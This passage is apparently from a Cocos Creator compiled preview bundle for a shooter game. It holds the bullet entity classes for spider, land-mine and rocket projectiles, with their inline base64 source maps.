bmd0aCAtIG51bSAtIDE7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIHVwZGF0ZURhdGEoKXtcclxuICAgICAgICBsZXQgYXJyID0gdGhpcy5saXN0LnNsaWNlKDAsIE1hdGgubWluKHRoaXMuX2RhdGFzLmxlbmd0aCwgdGhpcy5saXN0Lmxlbmd0aCkpO1xyXG4gICAgICAgIHRoaXMudXBkYXRlSXRlbXMoYXJyLCAwKTtcclxuICAgIH1cclxuXHJcbiAgICBzaG93QWN0aW9uKCl7XHJcbiAgICAgICAgdGhpcy5saXN0LnNsaWNlKDAsIE1hdGgubWluKHRoaXMuX2RhdGFzLmxlbmd0aCwgdGhpcy5saXN0Lmxlbmd0aCkpLmZvckVhY2goKHZhbHVlLCBpbmRleCkgPT4ge1xyXG4gICAgICAgICAgICB2YWx1ZS5zY2FsZVggPSAwO1xyXG4gICAgICAgICAgICBpZiAodmFsdWUuYWN0aXZlKXtcclxuICAgICAgICAgICAgICAgIHZhbHVlLnJ1bkFjdGlvbihjYy5zY2FsZVRvKDAuMysoMC4wOCppbmRleCksIDEpLmVhc2luZyhjYy5lYXNlQ3ViaWNBY3Rpb25Jbk91dCgpKSk7XHJcbiAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICBsZXQgY29tcCA9IHZhbHVlLmFkZENvbXBvbmVudChjYy5Db21wb25lbnQpO1xyXG4gICAgICAgICAgICAgICAgY29tcFsnb25FbmFibGUnXSA9ICgpPT57XHJcbiAgICAgICAgICAgICAgICAgICAgdmFsdWUucnVuQWN0aW9uKGNjLnNjYWxlVG8oMC4zKygwLjA4KmluZGV4KSwgMSkuZWFzaW5nKGNjLmVhc2VDdWJpY0FjdGlvbkluT3V0KCkpKTtcclxuICAgICAgICAgICAgICAgIH07XHJcbiAgICAgICAgICAgICAgICBjb21wWydvbkRpc2FibGUnXSA9ICgpPT57XHJcbiAgICAgICAgICAgICAgICAgICAgY29tcC5kZXN0cm95KCk7XHJcbiAgICAgICAgICAgICAgICB9O1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSB1cGRhdGVJdGVtcyhhcnI6QXJyYXk8Y2MuTm9kZT4sIGluZGV4Om51bWJlcil7XHJcbiAgICAgICAgaWYgKGluZGV4IDwgYXJyLmxlbmd0aCl7XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MuZGVsYXlUaW1lKDApLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgbGV0IG5vZGUgPSBhcnJbaW5kZXhdO1xyXG4gICAgICAgICAgICAgICAgbm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgdGhpcy51cGRhdGVJdGVtKG5vZGUsIHRoaXMuZmlyc3RJbmRleCtpbmRleCk7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnVwZGF0ZUl0ZW1zKGFyciwgaW5kZXgrMSk7XHJcbiAgICAgICAgICAgIH0pKSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIHVwZGF0ZUl0ZW0obm9kZTpjYy5Ob2RlLCBpbmRleDpudW1iZXIpe1xyXG4gICAgICAgIGxldCB2YWx1ZSA9IHRoaXMuX2RhdGFzW2luZGV4XTtcclxuICAgICAgICBsZXQgaXRlbU1lZGlhdG9yID0gbm9kZS5nZXRDb21wb25lbnQoQWJzdHJhY3RUYWJsZUl0ZW0pO1xyXG4gICAgICAgIGl0ZW1NZWRpYXRvci51cGFkdGVJdGVtKHZhbHVlLCBpbmRleCk7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBvblNjcm9sbEV2ZW50KGV2ZW50KXtcclxuICAgICAgICAvLyBjb25zb2xlLmxvZyhldmVudCwgXCJldmVudFwiKTtcclxuICAgICAgICBsZXQgY29udGVudCA9IHRoaXMuc2Nyb2xsVmlldy5jb250ZW50O1xyXG4gICAgICAgIC8vIGxldCBjb250ZW50SGVpZ2h0ID0gY29udGVudC5nZXRDb250ZW50U2l6ZSgpLmhlaWdodDtcclxuICAgICAgICBsZXQgdmlld0hlaWdodCA9IHRoaXMuc2Nyb2xsVmlldy5ub2RlLmdldENvbnRlbnRTaXplKCkuaGVpZ2h0O1xyXG4gICAgICAgIC8qaWYgKCghdGhpcy5zY3JvbGxWaWV3LmlzQXV0b1Njcm9sbGluZygpICYmICF0aGlzLnNjcm9sbFZpZXcuaXNTY3JvbGxpbmcoKSkgfHwgY29udGVudC55IDwgMCB8fCBjb250ZW50LnkgPj0gY29udGVudEhlaWdodCAtIHZpZXdIZWlnaHQpe1xyXG4gICAgICAgICAgICByZXR1cm47XHJcbiAgICAgICAgfSovXHJcbiAgICAgICAgbGV0IGNvbnRlbnRZID0gY29udGVudC55O1xyXG4gICAgICAgIC8vIGNvbnNvbGUubG9nKGNvbnRlbnRZLCBcImNvbnRlbnRZXCIpO1xyXG4gICAgICAgIC8qKiDliKTmlq3nrKwx5Liq5YWD57SgIOWSjCDlgJLmlbDnrKwx5Liq5YWD57Sg55qE5L2N572uICovXHJcbiAgICAgICAgLyoqIOS4iui+ueeVjCAqL1xyXG4gICAgICAgIGxldCBpdGVtSGVpZ2h0SGFsZiA9IHRoaXMuaXRlbUhlaWdodC8yO1xyXG5cclxuICAgICAgICAvKiog5aS05o+S5YWlICovXHJcbiAgICAgICAgd2hpbGUodGhpcy5maXJzdEluZGV4ID4gMCAmJiB0aGlzLmxpc3RbMF0ueSArIHRoaXMubWFyZ2luVG9wICsgaXRlbUhlaWdodEhhbGYgPCAtY29udGVudFkpe1xyXG4gICAgICAgICAgICBsZXQgbGFzdCA9IHRoaXMubGlzdC5wb3AoKTtcclxuICAgICAgICAgICAgbGFzdC55ID0gdGhpcy5saXN0WzBdLnkgKyB0aGlzLml0ZW1IZWlnaHQgKyB0aGlzLm1hcmdpbjtcclxuICAgICAgICAgICAgdGhpcy5saXN0LnVuc2hpZnQobGFzdCk7XHJcbiAgICAgICAgICAgIHRoaXMuZmlyc3RJbmRleC0tO1xyXG4gICAgICAgICAgICAvLyBjb25zb2xlLmxvZyhcIj09PT09PT09PT09PuWwvuenu+WktFwiKTtcclxuICAgICAgICAgICAgdGhpcy51cGRhdGVJdGVtKGxhc3QsIHRoaXMuZmlyc3RJbmRleCk7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICAvKiog5bC+5o+S5YWlICovXHJcbiAgICAgICAgd2hpbGUodGhpcy5maXJzdEluZGV4IDwgdGhpcy5maXJzdEluZGV4TWF4ICYmIHRoaXMubGlzdFt0aGlzLmxpc3QubGVuZ3RoLTFdLnkgLSBpdGVtSGVpZ2h0SGFsZiAtIHRoaXMubWFyZ2luQm90dG9tID4gLWNvbnRlbnRZIC0gdmlld0hlaWdodCl7XHJcbiAgICAgICAgICAgIGxldCBmaXJzdCA9IHRoaXMubGlzdC5zaGlmdCgpO1xyXG4gICAgICAgICAgICBmaXJzdC55ID0gdGhpcy5saXN0W3RoaXMubGlzdC5sZW5ndGgtMV0ueSAtIHRoaXMuaXRlbUhlaWdodCAtIHRoaXMubWFyZ2luO1xyXG4gICAgICAgICAgICB0aGlzLmxpc3QucHVzaChmaXJzdCk7XHJcbiAgICAgICAgICAgIHRoaXMuZmlyc3RJbmRleCsrO1xyXG4gICAgICAgICAgICAvLyBjb25zb2xlLmxvZyhcIj09PT09PT09PT09PuWktOenu+WwvlwiLCB0aGlzLmxpc3RbdGhpcy5saXN0Lmxlbmd0aC0xXS55KTtcclxuICAgICAgICAgICAgdGhpcy51cGRhdGVJdGVtKGZpcnN0LCB0aGlzLmZpcnN0SW5kZXgrdGhpcy5saXN0Lmxlbmd0aC0xKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bullet/BulletOfSpider.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '3c259gWcuxDorUu2dpLcxFV', 'BulletOfSpider');
// script/app/entities/bullet/BulletOfSpider.ts

Object.defineProperty(exports, "__esModule", { value: true });
var BulletOfEnemy_1 = require("./BulletOfEnemy");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletOfSpider = /** @class */ (function (_super) {
    __extends(BulletOfSpider, _super);
    function BulletOfSpider() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.ske = null;
        return _this;
    }
    BulletOfSpider.prototype.init = function (id) {
        var _this = this;
        _super.prototype.init.call(this, id);
        this.bThrought = true;
        this.ske = this.getComponent(sp.Skeleton);
        this.ske.setCompleteListener(function () {
            _this.node.active = false;
        });
    };
    BulletOfSpider.prototype.boom = function () {
        this.ske.setAnimation(0, "slow", false);
    };
    BulletOfSpider = __decorate([
        ccclass
    ], BulletOfSpider);
    return BulletOfSpider;
}(BulletOfEnemy_1.default));
exports.default = BulletOfSpider;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldC9CdWxsZXRPZlNwaWRlci50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsaURBQTRDO0FBRXRDLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQTRDLGtDQUFhO0lBQXpEO1FBQUEscUVBaUJDO1FBZkcsU0FBRyxHQUFlLElBQUksQ0FBQzs7SUFlM0IsQ0FBQztJQVpHLDZCQUFJLEdBQUosVUFBSyxFQUFVO1FBQWYsaUJBT0M7UUFORyxpQkFBTSxJQUFJLFlBQUMsRUFBRSxDQUFDLENBQUM7UUFDZixJQUFJLENBQUMsU0FBUyxHQUFHLElBQUksQ0FBQztRQUN0QixJQUFJLENBQUMsR0FBRyxHQUFHLElBQUksQ0FBQyxZQUFZLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQyxDQUFDO1FBQzFDLElBQUksQ0FBQyxHQUFHLENBQUMsbUJBQW1CLENBQUM7WUFDekIsS0FBSSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1FBQzdCLENBQUMsQ0FBQyxDQUFBO0lBQ04sQ0FBQztJQUVELDZCQUFJLEdBQUo7UUFDSSxJQUFJLENBQUMsR0FBRyxDQUFDLFlBQVksQ0FBQyxDQUFDLEVBQUUsTUFBTSxFQUFFLEtBQUssQ0FBQyxDQUFDO0lBQzVDLENBQUM7SUFoQmdCLGNBQWM7UUFEbEMsT0FBTztPQUNhLGNBQWMsQ0FpQmxDO0lBQUQscUJBQUM7Q0FqQkQsQUFpQkMsQ0FqQjJDLHVCQUFhLEdBaUJ4RDtrQkFqQm9CLGNBQWMiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IEJ1bGxldE9mRW5lbXkgZnJvbSBcIi4vQnVsbGV0T2ZFbmVteVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBCdWxsZXRPZlNwaWRlciBleHRlbmRzIEJ1bGxldE9mRW5lbXkge1xyXG5cclxuICAgIHNrZTpzcC5Ta2VsZXRvbiA9IG51bGw7XHJcblxyXG5cclxuICAgIGluaXQoaWQ6IG51bWJlcik6IHZvaWQge1xyXG4gICAgICAgIHN1cGVyLmluaXQoaWQpO1xyXG4gICAgICAgIHRoaXMuYlRocm91Z2h0ID0gdHJ1ZTtcclxuICAgICAgICB0aGlzLnNrZSA9IHRoaXMuZ2V0Q29tcG9uZW50KHNwLlNrZWxldG9uKTtcclxuICAgICAgICB0aGlzLnNrZS5zZXRDb21wbGV0ZUxpc3RlbmVyKCgpPT57XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICB9KVxyXG4gICAgfVxyXG5cclxuICAgIGJvb20oKXtcclxuICAgICAgICB0aGlzLnNrZS5zZXRBbmltYXRpb24oMCwgXCJzbG93XCIsIGZhbHNlKTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bullet/BulletOfDiLei.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'ea76fcmuIdJV6eQoHlSHVSh', 'BulletOfDiLei');
// script/app/entities/bullet/BulletOfDiLei.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Bullet_1 = require("./Bullet");
var Facade_1 = require("../../../../framework/facade/Facade");
var GameProxy_1 = require("../../game/GameProxy");
var ExcelConfig_1 = require("../../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../../config/ExcelTableNames");
var World_1 = require("../../info/World");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletOfDiLei = /** @class */ (function (_super) {
    __extends(BulletOfDiLei, _super);
    function BulletOfDiLei() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this._gameExplosivesController = null;
        return _this;
    }
    BulletOfDiLei.prototype.strike = function (other, self) {
        // super.strike(other, self);
    };
    BulletOfDiLei.prototype.init = function (id) {
        this.bulletId = id;
        var cfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Prop)[this.bulletId - 1];
        this.bThrought = cfg['pierce'] === 1;
        this.repel = cfg['repel'];
        this.stiff = cfg['stiff'];
        var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon)[0];
        this.hurt = Math.floor(config['hurt'] * World_1.World.My.armory.hurtMulOf(1)) * cfg['hurt'];
    };
    BulletOfDiLei.prototype.onLoad = function () {
        _super.prototype.onLoad.call(this);
        this._gameExplosivesController = Facade_1.default.findComponent("GameScene", "GameExplosivesController");
    };
    BulletOfDiLei.prototype.onCollisionEnter = function (other, self) {
        /** 爆炸 */
        this.node.active = false;
        this.boom();
    };
    BulletOfDiLei.prototype.boom = function () {
        var explosiveHuoJianTong = this._gameExplosivesController.getInactiveExplosive(9);
        explosiveHuoJianTong.node.position = this.node.position;
        explosiveHuoJianTong.node.active = true;
        explosiveHuoJianTong.node.scale = 0.5;
        explosiveHuoJianTong.node.rotation = Math.random() * 360;
        explosiveHuoJianTong.boom();
        GameProxy_1.GameProxy.emit(GameProxy_1.GameProxy.Event.ShakeScreen, 0.08, 2, 2);
    };
    BulletOfDiLei = __decorate([
        ccclass
    ], BulletOfDiLei);
    return BulletOfDiLei;
}(Bullet_1.default));
exports.default = BulletOfDiLei;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldC9CdWxsZXRPZkRpTGVpLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSxtQ0FBOEI7QUFDOUIsOERBQXlEO0FBQ3pELGtEQUErQztBQUMvQyx3RUFBcUU7QUFDckUsZ0VBQTZEO0FBQzdELDBDQUF1QztBQUVqQyxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUEyQyxpQ0FBTTtJQUFqRDtRQUFBLHFFQTBDQztRQXhDVywrQkFBeUIsR0FBRyxJQUFJLENBQUM7O0lBd0M3QyxDQUFDO0lBckNHLDhCQUFNLEdBQU4sVUFBTyxLQUFLLEVBQUUsSUFBSTtRQUNkLDZCQUE2QjtJQUNqQyxDQUFDO0lBRUQsNEJBQUksR0FBSixVQUFLLEVBQVU7UUFDWCxJQUFJLENBQUMsUUFBUSxHQUFHLEVBQUUsQ0FBQztRQUNuQixJQUFJLEdBQUcsR0FBRyx5QkFBVyxDQUFDLGFBQWEsQ0FBQyxpQ0FBZSxDQUFDLElBQUksQ0FBQyxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUMsQ0FBQyxDQUFDLENBQUM7UUFDM0UsSUFBSSxDQUFDLFNBQVMsR0FBRyxHQUFHLENBQUMsUUFBUSxDQUFDLEtBQUssQ0FBQyxDQUFDO1FBQ3JDLElBQUksQ0FBQyxLQUFLLEdBQUcsR0FBRyxDQUFDLE9BQU8sQ0FBQyxDQUFDO1FBQzFCLElBQUksQ0FBQyxLQUFLLEdBQUcsR0FBRyxDQUFDLE9BQU8sQ0FBQyxDQUFDO1FBQzFCLElBQUksTUFBTSxHQUFHLHlCQUFXLENBQUMsYUFBYSxDQUFDLGlDQUFlLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7UUFDbEUsSUFBSSxDQUFDLElBQUksR0FBRyxJQUFJLENBQUMsS0FBSyxDQUFDLE1BQU0sQ0FBQyxNQUFNLENBQUMsR0FBQyxhQUFLLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxTQUFTLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBQyxHQUFHLENBQUMsTUFBTSxDQUFDLENBQUM7SUFDcEYsQ0FBQztJQUdELDhCQUFNLEdBQU47UUFDSSxpQkFBTSxNQUFNLFdBQUUsQ0FBQztRQUNmLElBQUksQ0FBQyx5QkFBeUIsR0FBRyxnQkFBTSxDQUFDLGFBQWEsQ0FBQyxXQUFXLEVBQUUsMEJBQTBCLENBQUMsQ0FBQztJQUNuRyxDQUFDO0lBSUQsd0NBQWdCLEdBQWhCLFVBQWlCLEtBQUssRUFBRSxJQUFJO1FBQ3hCLFNBQVM7UUFDVCxJQUFJLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7UUFDekIsSUFBSSxDQUFDLElBQUksRUFBRSxDQUFDO0lBQ2hCLENBQUM7SUFFRCw0QkFBSSxHQUFKO1FBQ0ksSUFBSSxvQkFBb0IsR0FBRyxJQUFJLENBQUMseUJBQXlCLENBQUMsb0JBQW9CLENBQUMsQ0FBQyxDQUFDLENBQUM7UUFDbEYsb0JBQW9CLENBQUMsSUFBSSxDQUFDLFFBQVEsR0FBRyxJQUFJLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQztRQUN4RCxvQkFBb0IsQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQztRQUN4QyxvQkFBb0IsQ0FBQyxJQUFJLENBQUMsS0FBSyxHQUFHLEdBQUcsQ0FBQztRQUN0QyxvQkFBb0IsQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFHLElBQUksQ0FBQyxNQUFNLEVBQUUsR0FBQyxHQUFHLENBQUM7UUFDdkQsb0JBQW9CLENBQUMsSUFBSSxFQUFFLENBQUM7UUFDNUIscUJBQVMsQ0FBQyxJQUFJLENBQUMscUJBQVMsQ0FBQyxLQUFLLENBQUMsV0FBVyxFQUFFLElBQUksRUFBRSxDQUFDLEVBQUUsQ0FBQyxDQUFDLENBQUM7SUFDNUQsQ0FBQztJQXpDZ0IsYUFBYTtRQURqQyxPQUFPO09BQ2EsYUFBYSxDQTBDakM7SUFBRCxvQkFBQztDQTFDRCxBQTBDQyxDQTFDMEMsZ0JBQU0sR0EwQ2hEO2tCQTFDb0IsYUFBYSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgQnVsbGV0IGZyb20gXCIuL0J1bGxldFwiO1xyXG5pbXBvcnQgRmFjYWRlIGZyb20gXCIuLi8uLi8uLi8uLi9mcmFtZXdvcmsvZmFjYWRlL0ZhY2FkZVwiO1xyXG5pbXBvcnQge0dhbWVQcm94eX0gZnJvbSBcIi4uLy4uL2dhbWUvR2FtZVByb3h5XCI7XHJcbmltcG9ydCB7RXhjZWxDb25maWd9IGZyb20gXCIuLi8uLi8uLi8uLi9mcmFtZXdvcmsvY29uZmlnL0V4Y2VsQ29uZmlnXCI7XHJcbmltcG9ydCB7RXhjZWxUYWJsZU5hbWVzfSBmcm9tIFwiLi4vLi4vY29uZmlnL0V4Y2VsVGFibGVOYW1lc1wiO1xyXG5pbXBvcnQge1dvcmxkfSBmcm9tIFwiLi4vLi4vaW5mby9Xb3JsZFwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBCdWxsZXRPZkRpTGVpIGV4dGVuZHMgQnVsbGV0IHtcclxuXHJcbiAgICBwcml2YXRlIF9nYW1lRXhwbG9zaXZlc0NvbnRyb2xsZXIgPSBudWxsO1xyXG5cclxuXHJcbiAgICBzdHJpa2Uob3RoZXIsIHNlbGYpOiB2b2lkIHtcclxuICAgICAgICAvLyBzdXBlci5zdHJpa2Uob3RoZXIsIHNlbGYpO1xyXG4gICAgfVxyXG5cclxuICAgIGluaXQoaWQ6IG51bWJlcik6IHZvaWQge1xyXG4gICAgICAgIHRoaXMuYnVsbGV0SWQgPSBpZDtcclxuICAgICAgICBsZXQgY2ZnID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuUHJvcClbdGhpcy5idWxsZXRJZC0xXTtcclxuICAgICAgICB0aGlzLmJUaHJvdWdodCA9IGNmZ1sncGllcmNlJ10gPT09IDE7XHJcbiAgICAgICAgdGhpcy5yZXBlbCA9IGNmZ1sncmVwZWwnXTtcclxuICAgICAgICB0aGlzLnN0aWZmID0gY2ZnWydzdGlmZiddO1xyXG4gICAgICAgIGxldCBjb25maWcgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5XZWFwb24pWzBdO1xyXG4gICAgICAgIHRoaXMuaHVydCA9IE1hdGguZmxvb3IoY29uZmlnWydodXJ0J10qV29ybGQuTXkuYXJtb3J5Lmh1cnRNdWxPZigxKSkqY2ZnWydodXJ0J107XHJcbiAgICB9XHJcblxyXG5cclxuICAgIG9uTG9hZCgpOiB2b2lkIHtcclxuICAgICAgICBzdXBlci5vbkxvYWQoKTtcclxuICAgICAgICB0aGlzLl9nYW1lRXhwbG9zaXZlc0NvbnRyb2xsZXIgPSBGYWNhZGUuZmluZENvbXBvbmVudChcIkdhbWVTY2VuZVwiLCBcIkdhbWVFeHBsb3NpdmVzQ29udHJvbGxlclwiKTtcclxuICAgIH1cclxuXHJcblxyXG5cclxuICAgIG9uQ29sbGlzaW9uRW50ZXIob3RoZXIsIHNlbGYpOiB2b2lkIHtcclxuICAgICAgICAvKiog54iG54K4ICovXHJcbiAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMuYm9vbSgpO1xyXG4gICAgfVxyXG5cclxuICAgIGJvb20oKXtcclxuICAgICAgICBsZXQgZXhwbG9zaXZlSHVvSmlhblRvbmcgPSB0aGlzLl9nYW1lRXhwbG9zaXZlc0NvbnRyb2xsZXIuZ2V0SW5hY3RpdmVFeHBsb3NpdmUoOSk7XHJcbiAgICAgICAgZXhwbG9zaXZlSHVvSmlhblRvbmcubm9kZS5wb3NpdGlvbiA9IHRoaXMubm9kZS5wb3NpdGlvbjtcclxuICAgICAgICBleHBsb3NpdmVIdW9KaWFuVG9uZy5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgZXhwbG9zaXZlSHVvSmlhblRvbmcubm9kZS5zY2FsZSA9IDAuNTtcclxuICAgICAgICBleHBsb3NpdmVIdW9KaWFuVG9uZy5ub2RlLnJvdGF0aW9uID0gTWF0aC5yYW5kb20oKSozNjA7XHJcbiAgICAgICAgZXhwbG9zaXZlSHVvSmlhblRvbmcuYm9vbSgpO1xyXG4gICAgICAgIEdhbWVQcm94eS5lbWl0KEdhbWVQcm94eS5FdmVudC5TaGFrZVNjcmVlbiwgMC4wOCwgMiwgMik7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bullet/BulletOfXuanFengHuoPao.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'e66bcwOmhtNi6ipYqY6Dey8', 'BulletOfXuanFengHuoPao');
// script/app/entities/bullet/BulletOfXuanFengHuoPao.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Bullet_1 = require("./Bullet");
var ExcelConfig_1 = require("../../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../../config/ExcelTableNames");
var World_1 = require("../../info/World");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletOfXuanFengHuoPao = /** @class */ (function (_super) {
    __extends(BulletOfXuanFengHuoPao, _super);
    function BulletOfXuanFengHuoPao() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    BulletOfXuanFengHuoPao.prototype.strike = function (other, self) {
        // super.strike(other, self);
    };
    BulletOfXuanFengHuoPao.prototype.init = function (id) {
        this.bulletId = id;
        var cfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Prop)[this.bulletId - 1];
        this.bThrought = cfg['pierce'] === 1;
        this.repel = cfg['repel'];
        this.stiff = cfg['stiff'];
        var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon)[0];
        this.hurt = Math.floor(config['hurt'] * World_1.World.My.armory.hurtMulOf(1)) * cfg['hurt'];
    };
    BulletOfXuanFengHuoPao = __decorate([
        ccclass
    ], BulletOfXuanFengHuoPao);
    return BulletOfXuanFengHuoPao;
}(Bullet_1.default));
exports.default = BulletOfXuanFengHuoPao;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldC9CdWxsZXRPZlh1YW5GZW5nSHVvUGFvLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSxtQ0FBOEI7QUFDOUIsd0VBQXFFO0FBQ3JFLGdFQUE2RDtBQUM3RCwwQ0FBdUM7QUFFakMsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBb0QsMENBQU07SUFBMUQ7O0lBZ0JBLENBQUM7SUFiRyx1Q0FBTSxHQUFOLFVBQU8sS0FBSyxFQUFFLElBQUk7UUFDZCw2QkFBNkI7SUFDakMsQ0FBQztJQUVELHFDQUFJLEdBQUosVUFBSyxFQUFVO1FBQ1gsSUFBSSxDQUFDLFFBQVEsR0FBRyxFQUFFLENBQUM7UUFDbkIsSUFBSSxHQUFHLEdBQUcseUJBQVcsQ0FBQyxhQUFhLENBQUMsaUNBQWUsQ0FBQyxJQUFJLENBQUMsQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFDLENBQUMsQ0FBQyxDQUFDO1FBQzNFLElBQUksQ0FBQyxTQUFTLEdBQUcsR0FBRyxDQUFDLFFBQVEsQ0FBQyxLQUFLLENBQUMsQ0FBQztRQUNyQyxJQUFJLENBQUMsS0FBSyxHQUFHLEdBQUcsQ0FBQyxPQUFPLENBQUMsQ0FBQztRQUMxQixJQUFJLENBQUMsS0FBSyxHQUFHLEdBQUcsQ0FBQyxPQUFPLENBQUMsQ0FBQztRQUMxQixJQU